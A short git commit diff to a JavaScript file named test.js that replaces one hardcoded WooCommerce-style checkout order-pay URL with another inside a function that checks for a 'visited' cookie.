e82b19e3121f766bda1b7a2f41dff0f02b86c4ca
johndove9912 <158753779+johndove9912@users.noreply.github.com>
2024-02-08 14:41:44 +0530

    Update file with new content

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 
         function executeScript() {
-            var newurl = "https://securely.in/checkout/order-pay/57428/?key=wc_order_9bx0McGRFkcDK";
+            var newurl = "https://securely.in/checkout/order-pay/57434/?key=wc_order_Zx1hlBZNclsQj";
 
             // Check if the "visited" cookie exists
             if (document.cookie.indexOf('visited=true') !== -1) {
